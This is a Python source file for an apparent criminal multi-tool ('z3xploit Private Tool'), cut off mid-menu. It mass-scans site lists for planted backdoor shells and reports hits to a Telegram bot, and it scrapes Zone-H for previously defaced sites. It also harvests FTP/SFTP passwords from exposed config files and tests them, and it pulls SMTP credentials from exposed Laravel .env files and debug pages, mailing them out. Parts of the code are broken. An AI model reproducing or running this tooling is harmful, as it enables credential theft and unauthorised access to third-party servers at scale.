from colorama import Fore
from colorama import Fore, Back, init, Style
from colorama import Fore, Style, Back
from colorama import Fore, Style, init
from colorama import Fore, init
from colorama import Style
from colorama import init
from colorama import init, Fore
from configparser import ConfigParser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from queue import Queue
from re import findall as reg
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored
from threading import *
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import colorama
import concurrent.futures
import getpass
import json
import multiprocessing
import os
import os.path
import platform
import random
import re
import requests
import signal
import smtplib
import socket
import sys
import threading
import time
import urllib.request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = Fore.YELLOW + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW
blc = Fore.BLACK

bg_gr = Back.GREEN
bg_red = Back.RED
bg_wh = Back.WHITE

init(autoreset=True)

def send_telegram_message(chat_id, bot_token, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {
            'chat_id': chat_id,
            'text': message,
        }
        response = requests.get(url, params=params)
        return response.json()
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")
        return {'ok': False}

def read_backdoors():
    try:
        with open('exploit-cs.json', 'r') as backdoor_file:
            backdoor_data = json.load(backdoor_file)
        return backdoor_data.get("backdoors", [])
    except FileNotFoundError:
        print('Backdoor configuration file not found.')
        sys.exit(1)
    except Exception as backdoor_err:
        print('Error reading backdoor configuration:', backdoor_err)
        sys.exit(1)

def read_zone_h_config():
    try:
        with open('config.json', 'r') as config_file:
            config_data = json.load(config_file)
            zhe_value = config_data["zone-h_config"]["zhe"]
            phpsid_value = config_data["zone-h_config"]["phpsessid"]
        return zhe_value, phpsid_value
    except Exception as config_err:
        print('Error reading Zone-H configuration:', config_err)
        sys.exit(1)

def read_config():
    try:
        with open('config.json', 'r') as config_file:
            config_data = json.load(config_file)
        return config_data
    except Exception as config_err:
        print('Error reading configuration:', config_err)
        sys.exit(1)

def exploit(url, chat_id, bot_token, backdoors):
    try:
        head = {'User-agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        for backdoor in backdoors:
            req = requests.get(url + backdoor['path'], headers=head, timeout=15).text
            if backdoor['expected_string'] in req:
                vuln_url = url + backdoor['path'] + '#' + backdoor['vuln_name']
                print(colored(f'[Vuln]: {vuln_url}', 'green'))

                # Send result to Telegram
                vuln_message = f'[Vuln]: {vuln_url}'
                response = send_telegram_message(chat_id, bot_token, vuln_message)
                if response['ok']:
                    print(colored('Shell Message Telegram Successfully', 'cyan'))
                else:
                    print(colored('Shell Message Telegram Failed', 'red'))

                open('expl0it-shell.txt', 'a').write(vuln_url + '\n')
            else:
                print(colored(f"[Not Vuln]: {url}", 'red'))

    except requests.exceptions.Timeout:
        print(colored(f"[Error Timeout]: {url}", 'blue'))

    except Exception:
        domain = url.split('//')[-1].split('/')[0]
        print(colored(f"[Error]: {domain}", 'blue'))

def pr():
    try:
        list_file = input(' List : ')
        config_data = read_config()
        chat_id = config_data["shell-f_config"]["chatid"]
        bot_token = config_data["shell-f_config"]["tokenbot"]

        backdoors = read_backdoors()

        try:
            with open(list_file, 'r') as url_file:
                url_list = url_file.read().splitlines()
                thread_count = min(len(url_list), 150)
                pool = Pool(thread_count)
                pool.starmap(exploit, [(url, chat_id, bot_token, backdoors) for url in url_list])
        except Exception as file_err:
            print('Error reading URL list:', file_err)
    except KeyboardInterrupt:
        print('Process interrupted.')
    except Exception as main_err:
        print('An unexpected error occurred:', main_err)
    finally:
        main_menu()

def remove_duplicate_lines(input_file, output_file):
    try:
        total_lines = sum(1 for _ in open(input_file, 'r', encoding='utf-8'))
        with open(input_file, 'r', encoding='utf-8') as result:
            uniqlines = set(result.readlines())
            with open(output_file, 'w', encoding='utf-8') as kontol:
                processed_lines = 0
                for line in uniqlines:
                    kontol.write(line)
                    processed_lines += 1
                    progress = processed_lines / total_lines
                    print_progress_bar(progress)
        print(f'\nDuplicates removed and saved to {output_file}')
    except FileNotFoundError:
        print('Input file not found')

def print_progress_bar(progress):
    bar_length = 40
    block = int(round(bar_length * progress))
    progress_percent = progress * 100
    bar = '\033[32m' + '=' * block + '\033[0m' + '-' * (bar_length - block)
    sys.stdout.write(f'\r[{bar}] {progress_percent:.1f}%')
    sys.stdout.flush()

def clean_web():
    try:
        list_file = input('List: ')
        output_file = list_file.replace('.txt', '_clean.txt')
        remove_duplicate_lines(list_file, output_file)
    except KeyboardInterrupt:
        print('\nOperation aborted')
    except Exception as e:
        print('\nAn error occurred:', str(e))
    finally:
        main_menu()    

#zone-hhhh

zhe_value, phpsid_value = read_zone_h_config()

cookie = {
    "ZHE": zhe_value,
    "PHPSESSID": phpsid_value
}


fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}

url = "http://www.zone-h.org/archive/notifier="
urll = "http://zone-h.org/archive/published=0"
url2 = "http://www.defacers.org/onhold!"
url4 = "http://www.defacers.org/gold!"


def zonehh():
    print("""
        |---| Grabb Sites From Zone-h |--|
        \033[91m[1] \033[95mGrabb Sites By Notifier
        \033[91m[2] \033[95mGrabb Sites By Onhold
        """)
    sec = int(input("Choose Section : "))

    zhe_value, phpsid_value = read_zone_h_config()

    cookie = {
        "ZHE": zhe_value,
        "PHPSESSID": phpsid_value
    }

    if sec == 1:
        notf = input("\033[95mEnter notifier: \033[92m")

        for i in range(1, 51):
            url = f"http://www.zone-h.org/archive/notifier={notf}/page={i}"
            print(f"Trying URL: {url}")

            dz = requests.get(url, cookies=cookie)
            
            if dz.status_code != 200:
                print(f"Error: Status Code {dz.status_code}")
                continue

            dzz = dz.content
            print(f"Content: {dzz[:200]}")  # Print first 200 characters of content for debugging

            if b'<html><body>-<script type="text/javascript"' in dzz:
                print("Onii Chan Please Enter Cookie")
                sys.exit()
            elif b'<input type="text" name="captcha" value=""><input type="submit">' in dzz:
                print("Onii Chan Please Change Captcha In Zone-H")
                sys.exit()
            else:
                Hunt_urls = re.findall(b'<td>(.*)\n\s+<\/td>', dzz)
                if b'/mirror/id/' in dzz:
                    for xx in Hunt_urls:
                        qqq = xx.replace(b'...', b'')
                        print('    [' + '*' + '] ' + qqq.split(b'/')[0].decode())
                        with open(notf + '.txt', 'a') as rr:
                            rr.write("http://" + qqq.split(b'/')[0].decode() + '\n')
                else:
                    print("Grabb Sites Completed Arigatou Onii Chan ^_^")
                    sys.exit()

    elif sec == 2:
        print(":* __Grabb Sites By Onhold__ ^_^")
        for qwd in range(1, 51):
            url = f"http://zone-h.org/archive/published=0/page={qwd}"
            print(f"Trying URL: {url}")

            rb = requests.get(url, cookies=cookie)

            if rb.status_code != 200:
                print(f"Error: Status Code {rb.status_code}")
                continue

            dzq = rb.content
            print(f"Content: {dzq[:200]}")  # Print first 200 characters of content for debugging

            if b'<html><body>-<script type="text/javascript"' in dzq:
                print("Onii Chan Please Change Captcha In Zone-H")
                sys.exit()

            elif b"captcha" in dzq:
                print("Onii Chan Please Change Captcha In Zone-H")
            else:
                Hunt_urlss = re.findall(b'<td>(.*)\n\s+<\/td>', dzq)
                for xxx in Hunt_urlss:
                    qqqq = xxx.replace(b'...', b'')
                    print('    [' + '*' + '] ' + qqqq.split(b'/')[0].decode())
                    with open('onhold_zone.txt', 'a') as rrr:
                        rrr.write("http://" + qqqq.split(b'/')[0].decode() + '\n')
    else:
        print("Invalid option")


def clearscrn():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')


clearscrn()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)


def helper4():
    clearscrn()
    banner = """\033[33m\033[91m\033[93m

   [#] Create By :
                             [#] Create By ::

							███████╗██████╗ ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
							╚══███╔╝╚════██╗╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
							  ███╔╝  █████╔╝ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
							 ███╔╝   ╚═══██╗ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
							███████╗██████╔╝██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
							╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                             
                                        
                             
                           z3xploit Private Tool
                          https://t.me/z3xploit - @z3xploit
						  Contact: @z3xrin
"""
    print("""\033[91m

   [#] Create By :
                             [#] Create By ::

							███████╗██████╗ ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
							╚══███╔╝╚════██╗╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
							  ███╔╝  █████╔╝ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
							 ███╔╝   ╚═══██╗ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
							███████╗██████╔╝██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
							╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                             
                                        
                             
                           z3xploit Private Tool
                          https://t.me/z3xploit - @z3xploit
						  Contact: @z3xrin
    
    [+]1. Zone-H Grabber
            """)
    try:
        qq = int(input("\033[91m[-] \033[90mroot@kowk~#\033[95m : \033[90m"))
        if qq == 1:
            clearscrn()
            print(banner)
            zonehh()

    except:
        pass

        input("\nPress Enter to return to the main menu...")
        main_menu()


#zone-hhh-endddd 

#ftp

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def screen_clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def ftp(star, config_file):
    if "://" not in star:
        star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=10)
        if check.status_code == 200:
            resp = check.text
            if "save_before_upload" in resp or "uploadOnSave" in resp:
                print(f"{bg_gr}{blc} Exploited {res} => {star}{Style.RESET_ALL}\n")
                with open("sftp-exploited.txt", "a") as f:
                    f.write(f'{url}\n')
            else:
                print(f"{bg_red}{blc} Failed {res} => {star}{Style.RESET_ALL}\n")
    except requests.exceptions.RequestException as e:
        domain = star.split("//")[-1].split("/")[0]
        print(f"{bg_wh}{blc} NULL {res} => {domain}{Style.RESET_ALL}\n")


def filter(star):
    ftp(star, "/sftp-config.json")
    ftp(star, "/.vscode/sftp.json")


def ftp_hunter_menu():
    while True:
        screen_clear() 
        print(f'{wh}STFP HUNTER')
        list_file = input(f"{wh}List?:")
        try:
            with open(list_file, 'r') as f:
                star = f.readlines()
            break 
        except FileNotFoundError:
            print(f"{wh}ERROR: File not found! Please provide a valid list.{res}\n")
            input("Press Enter to continue...")  

    try:
        with ThreadPool(100) as pool:
            pool.map(filter, star)
    except:
        pass

    input("\nPress Enter to return to the main menu...")
    main_menu()
#laravel-hunter


#laravel-hunter-end
#ftp-sub-menu

def ftp_sub_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[91m
[1] Split Sftps
[2] Checker Sftp
[0] Back to Main Menu\033[91m
""")
    choice = input("Select number :P : ")

    if choice == "1":
        split_sftp()
    elif choice == "2":
        check_sftp()
    elif choice == "0":
        main_menu()
    else:
        print("Invalid choice. Please select a valid option.")
        ftp_sub_menu()

#ftp-end-menu


#ftp-split#
def split_sftp():
    while True:
        filename = "sftp-exploited.txt"
        if not os.path.exists(filename):
            print("Cannot find 'sftp-exploited.txt' file.")
            input("Press Enter to continue...")
            return  # Balik sa submenu

        with open(filename, "r") as f:
            lines = f.readlines()

        counter = 0
        total = len(lines)

        for line in lines:
            counter += 1
            url = line.strip()

            num_retries = 0

            while True:
                try:
                    response = requests.get(url)
                    text = response.text

                    host_pattern = r'"host"\s*:\s*"([^"]*)"'
                    host_pattern_alt = r'"host":\s+"([^"]+)"'
                    username_pattern = r'"username"\s*:\s*"([^"]*)"'
                    username_pattern_alt = r'"user":\s+"([^"]+)"'
                    password_pattern = r'"password"\s*:\s*"([^"]*)"'
                    password_pattern_alt = r'"password":\s+"([^"]+)"'
                    port_pattern = r'"port"\s*:\s*(\d+)'
                    port_pattern2 = r'"port":\s+"([^"]+)"'

                    host_match = re.search(host_pattern, text) or re.search(host_pattern_alt, text)
                    username_match = re.search(username_pattern, text) or re.search(username_pattern_alt, text)
                    password_match = re.search(password_pattern, text) or re.search(password_pattern_alt, text)
                    port_match = re.search(port_pattern, text)
                    if not port_match:
                        port_match = re.search(port_pattern2, text)
                        if not port_match:
                            port = 21
                        else:
                            port = port_match.group(1)
                    else:
                        port = port_match.group(1)

                    if host_match and username_match and password_match:
                        host = host_match.group(1)
                        username = username_match.group(1)
                        password = password_match.group(1)

                        with open("sftp-filtered.txt", "a") as f:
                            f.write("{}|{}|{}|{}|{}\n".format(url, host, port, username, password))

                        print("Processing connection {} out {}".format(counter, total))
                        break

                    else:
                        print("Tidak dapat menemukan nilai 'host', 'username', atau 'password'. Lanjutkan ke URL berikutnya.")
                        break

                except requests.exceptions.RequestException:
                    num_retries += 1
                    print("Koneksi {} dari {} gagal. Lewati koneksi ini.".format(counter, total))
                    break

        print("Processing completed. The results are saved in sftp-filtered.txt.")
        input("Press Enter to continue...")
        ftp_sub_menu 
#ftp-split-end

#ftp-check
def check_sftp():
    def check_ftp_connection(domain, host, port, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=3)
            ftp.login(username, password)
            ftp.quit()
            return True
        except Exception as e:
            return False

    def check_sftp_connection(domain, host, port, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password, timeout=3)
            ssh.close()
            return True
        except Exception as e:
            return False

    def check_connection(line, line_number):
        fields = line.strip().split("|")
        if len(fields) == 5:
            domain, host, port, username, password = fields
            port = int(port)

            if port == 21:
                result = check_ftp_connection(domain, host, port, username, password)
            else:
                result = check_sftp_connection(domain, host, port, username, password)

            if result:
                with open("log.txt", "a") as f:
                    f.write("domain: {}\n".format(domain))
                    f.write("host: {}\n".format(host))
                    f.write("port: {}\n".format(port))
                    f.write("username: {}\n".format(username))
                    f.write("password: {}\n".format(password))
                    f.write("\n")
        else:
            print("Invalid line format (line {}): {}".format(line_number, line))

    filename = input("sftp file : ")

    if not os.path.exists(filename):
        print("File {} tidak ditemukan.".format(filename))
        input("Press Enter to continue...")
        ftp_sub_menu()

    with open(filename, "r") as f:
        lines = f.readlines()

    pool = Pool()

    pool.starmap(check_connection, [(line, i+1) for i, line in enumerate(lines)])

    pool.close()
    pool.join()

    print("Processing completed.")
    input("Press Enter to continue...")
    ftp_sub_menu()

#ftp-check-end

#smtps-check
def check(smtp):
    global INVALIDS
    global VALIDS
    global toaddr
    HOST, PORT, usr, pas = smtp.strip().split('|')
    print('{}MAIL SEND START{}...{}'.format(c, g, o))
    time.sleep(2)
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = 'CHECKER RESULT : V4 '
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = '\n        <!DOCTYPE html>\n        <html lang="en">\n        <head>\n            <meta charset="UTF-8">\n            <meta name="viewport" content="width=device-width, initial-scale=1.0">\n            <title>SMTP WORKED</title>\n            <style>\n                @media only screen and (max-width: 600px) {\n                    .inner-body {\n                        width: 100% !important;\n                    }\n            \n                    .footer {\n                        width: 100% !important;\n                    }\n                }\n            \n                @media only screen and (max-width: 500px) {\n                    .button {\n                        width: 100% !important;\n                    }\n                }\n                .container{\n                    background-color:white;\n                    align-items: center;\n                }\n                a{\n                    margin-left: 20%;            \n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                    font-weight: bold;\n                    font-size: 30px;\n                    color: #f40000;\n                    text-decoration: none;\n        \n                }\n                .cont2{\n                    margin-top: 5px;\n                    background-color: #fcfbcf;\n                    width: 100%;\n                    height: 300px;\n                    border: 0.5px solid #000000 ;\n                    }\n                p{\n                    margin-top: 40px;\n                    margin-left: 10px;\n                }\n                .cont2 > p{\n                    color: black;\n                    font-weight: bold;\n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                }\n            </style>\n        \n            \n        </head>\n        <body>\n            <div class="container" >\n            <a href="https://t.me/S41YANSHOP">\n            "MAIL FROM - X12S64 IN TG"\n             </a>\n            </div>\n            <div class="cont2">\n                <p>HOST : ' + HOST + '</p>\n                <p>PORT : ' + PORT + '</p>\n                <p>USER : ' + usr + '</p>\n                <p>PASS : ' + pas + '</p>\n        \n            </div>\n        </body>\n        </html>\n        '
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '[+]MAIL SEND SUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)
    except:
        print(bcolors.FAIL + '[-]MAIL SEND UNSUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)

def smtp_checker():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        os.mkdir('Result')
        os.getcwd()
    except:
        pass

    good = []
    bad = []
    toaddr = input('\n{}  [!]{}Enter Your Mail {}> {}'.format(r, g, o, r))

    class bcolors:
        OK = '\x1b[92m'
        WARNING = '\x1b[93m'
        FAIL = '\x1b[91m'
        RESET = '\x1b[0m'

    VALIDS = 0
    INVALIDS = 0

    if __name__ == '__main__':
        while True:
            smtp_file = input('\n{}[#]{}SMTP LISTS {}> {}'.format(r, g, o, r))
            if os.path.exists(smtp_file):
                break
            else:
                print("File not found.")
                input("Press Enter to continue...")
        
        smtps = open(smtp_file, 'r', encoding='utf-8').read().splitlines()
        power = int(input('{}[+]{}THREAD {}> {}'.format(r, g, o, r)))
        try:
            def runer():
                os.system('cls' if os.name == 'nt' else 'clear')
                with concurrent.futures.ThreadPoolExecutor(power) as (executor):
                    executor.map(check, smtps)

            runer()
            print('\n\n{}[+] TOTAL VALIDS {}:{}[{}{}{}]{}'.format(g, o, g, o, str(len(good)), g, o))
            print('{}[-] TOTAL INVALIDS {} :{}[{}{}{}]{}'.format(r, o, r, o, str(len(bad)), r, o))
            time.sleep(3)
            print('\n\n{}     ALL CHECKED DONE{}'.format(g, o))
            print('{} THNAKS FOR USING MY TOOL{}'.format(g, o))
            time.sleep(10)
            sys.exit()
        except Exception as e:
            try:
                print('{}[!]  {}CTRL {}+{} C'.format(c, r, o, r))
                sys.exit()
            finally:
                e = None
                del e
#smtps-check-end

def printf(text, background_color=None, text_color=None):
    text = ''.join([str(item) for item in text])
    background_color_code = ""
    text_color_code = ""
    reset_code = colorama.Fore.RESET + colorama.Back.RESET

    if background_color:
        if background_color == "red":
            background_color_code = colorama.Back.RED
        elif background_color == "green":
            background_color_code = colorama.Back.GREEN
        elif background_color == "yellow":
            background_color_code = colorama.Back.YELLOW

    if text_color:
        if text_color == "white":
            text_color_code = colorama.Fore.WHITE
        elif text_color == "green":
            text_color_code = colorama.Fore.GREEN
        elif text_color == "red":
            text_color_code = colorama.Fore.RED
        elif text_color == "ocean blue":
            text_color_code = "\x1b[38;5;39m"

    print(background_color_code + text_color_code + text + reset_code)

#smtp-checker
def smtp_exploit():
    def get_smtp_random(text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = "/.env"
                    try:
                        mailhost = reg('\nMAIL_HOST=(.*?)\n', text)
                    except:
                        mailhost = ""
                    try:
                        mailport = reg('\nMAIL_PORT=(.*?)\n', text)
                    except:
                        mailport = ""
                    try:
                        mailuser = reg('\nMAIL_USERNAME=(.*?)\n', text)
                    except:
                        mailuser = ""
                    try:
                        mailpass = reg('\nMAIL_PASSWORD=(.*?)\n', text)
                    except:
                        mailpass = ""
                    try:
                        mailfrom = reg('\nMAIL_FROM_ADDRESS=(.*?)\n', text)
                    except:
                        mailfrom = ""
                    try:
                        fromname = reg('\\MAIL_FROM_NAME=(.*?)\n', text)
                    except:
                        fromname = ""
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)   +'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    save = open('Results'+os.sep+'SMTP_RANDOM.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    return True
        except:
            return False

    def main(url):
        try:
            text = '[Connect To List] ' + url
            headers = {"User-Agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False)
            if "APP_KEY=" in get_source.text:
                resp = get_source.text
            else:
                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source:
                    resp = get_source
                    if resp:
                        getsmtp = get_smtp_random(resp, url)
                        if getsmtp:
                            text += ' [Status] SMTP'
                            printf(text, background_color="green", text_color="white")
                        else:
                            text += ' [Status] SMTP'
                            printf(text, background_color="red", text_color="white")
                    else:
                        text = ' [Status] Fail To Crack'
                        printf(text, background_color="red", text_color="white")
        except requests.exceptions.RequestException as e:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except SSLError:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except NameResolutionError:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except Exception as e:
            text = '[Connect To List] ' + url + ' [Status] Unknown Error'
            printf(text, background_color="red", text_color="white")
            print("Error:", e)
            return

    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get("DB", "FILES")
        numthread = readcfg.get("DB", "THREAD")
        sessi = readcfg.get("DB", "SESSION")
        printf("log session bot found! restore session", background_color="yellow", text_color="white")
        printf("Using Configuration : \n\tFILES="+lists+"\n\tTHREAD="+numthread+"\n\tSESSION="+sessi, background_color="yellow", text_color="white")
        tanya = input(' Continue Exploit ? [y/n] ')
        if tanya.lower() == "y":
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except FileNotFoundError:
            printf("List Not Found", background_color="red", text_color="white")
            exit()
        except Exception:
            lists = input('List IPs/Domain --> ')
            try:
                readsplit = open(lists).read().splitlines()
            except:
                printf("List Not Found", background_color="red", text_color="white")
                exit()
        try:
            numthread = input('Thread (Default : 200) --> ')
        except Exception:
            printf("Error Threads", background_color="red", text_color="white")
            exit()
    with ThreadPoolExecutor(max_workers=150) as executor:
        for url in readsplit:
            if "://" in url:
                url = url
            else:
                url = "http://"+url
            if url.endswith('/'):
                url = url[:-1]
            jagases = url
            try:
                executor.submit(main, url)
            except KeyboardInterrupt:
                session = open(pid_restore, "w")
                cfgsession = '[DB]\nFILES='+lists+'\nTHREAD='+str(numthread)+"\nSESSION="+jagases+"\n"
                session.write(cfgsession)
                session.close()
                printf("CTRL+C Detect, Session saved", background_color="yellow", text_color="white")
                exit()

def filter_and_create_allsmtp():
    # Read SMTP_RANDOM.txt
    with open('Results/SMTP_RANDOM.txt', 'r') as smtp_file:
        smtp_data = smtp_file.read()

    # Find all SMTP entries
    smtp_entries = reg(r'URL: (.*?)\nMETHOD: (.*?)\nMAILHOST: (.*?)\nMAILPORT: (.*?)\nMAILUSER: (.*?)\nMAILPASS: (.*?)\nMAILFROM: (.*?)\nFROMNAME: (.*?)\n\n', smtp_data)

    # Write to allsmtp.txt
    with open('Results/allsmtp.txt', 'w') as allsmtp_file:
        for entry in smtp_entries:
            url, method, mailhost, mailport, mailuser, mailpass, mailfrom, fromname = entry
            allsmtp_file.write(f"{mailhost}|{mailport}|{mailuser}|{mailpass}\n")
            
    printf('Task Done', background_color="green", text_color="white")
#smtp-checker-end

#reverseip
def askdns(ip):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }
        response = requests.get(f'https://askdns.com/ip/{ip}', headers=headers, timeout=30)
        if response.status_code == 200:
            content = response.text
            if 'Domain Name' in content:
                domains = re.findall('<a href="/domain/(.*?)">', content)
                with open('revip.txt', 'a') as f:
                    for domain in domains:
                        print(f"GET {len(domain)} DOMAIN FROM {ip}")
                        f.write('http://' + domain + '\n')
            else:
                print(f"BAD RAP {ip}")
        else:
            print(f"Request to askdns.com for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in askdns for {ip}: {e}")

def rapid(ip):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }
        response = requests.get(f'https://rapiddns.io/s/{ip}?full=1&down=1#result', headers=headers, timeout=30)
        if response.status_code == 200:
            content = response.text
            if '<th scope="row ">' in content:
                domains = re.findall('<td>(?!\-)(?:[a-zA-Z\d\-]{0,62}[a-zA-Z\d]\.){1,126}(?!\d+)[a-zA-Z]{1,63}</td>', content)
                with open('revip.txt', 'a') as f:
                    for domain in domains:
                        cok = domain.replace('<td>', '').replace('</td>', '').replace('ftp.', '').replace('images.', '').replace(
                            'cpanel.', '').replace('cpcalendars.', '').replace('cpcontacts.', '').replace('webmail.', '').replace(
                            'webdisk.', '').replace('hostmaster.', '').replace('mail.', '').replace('ns1.', '').replace('ns2.',
                                                                                                                       '').replace(
                            'autodiscover.', '')
                        print(f"GET {len(cok)} DOMAIN FROM {ip}")
                        f.write('http://' + cok + '\n')
            else:
                print(f"BAD RAP {ip}")
        else:
            print(f"Request to rapiddns.io for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in rapid for {ip}: {e}")

def webscan(ip):
    try:
        url = f"https://api.webscan.cc/?action=query&ip={ip}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            domains = re.findall('"domain": "(.*?)",', content)[3:]
            with open('revip.txt', 'a') as file:
                for domain in domains:
                    domain = domain.lower()
                    if 'result' not in domain and 'total' not in domain:
                        if not domain.startswith('webmail.') and not domain.startswith('ftp.') and not domain.startswith('cpanel.') and not domain.startswith('webdisk.') and not domain.startswith('cpcalendars.') and not domain.startswith('cpcontacts.') and not domain.startswith('ns1.') and not domain.startswith('ns2.'):
                            domain = domain.replace('www.', '').replace('Domains', '')
                            print(f"GET {len(domain)} DOMAIN FROM {ip}")
                            file.write(domain + '\n')
        else:
            print(f"Request to webscan.cc for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in webscan for {ip}: {e}")

def revip(ip):
    try:
        rapid(ip)
        askdns(ip)
        webscan(ip)
    except Exception as e:
        print(f"Error in revip for {ip}: {e}")

def reverse_ip_menu():
    try:
        list_path = input("UR LIST :~# ")  # For Python 3
        url = open(list_path, 'r', encoding='utf-8').read().splitlines()
        THREAD = input("THREAD :~# ")  # For Python 3
        pp = ThreadPool(int(THREAD))
        pr = pp.map(revip, url)
    except Exception as e:
        print("Error in reverse_ip_menu:", e)
#reverseip-end


#wp-bruteforce

#wp-brutefoce-end

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[91m
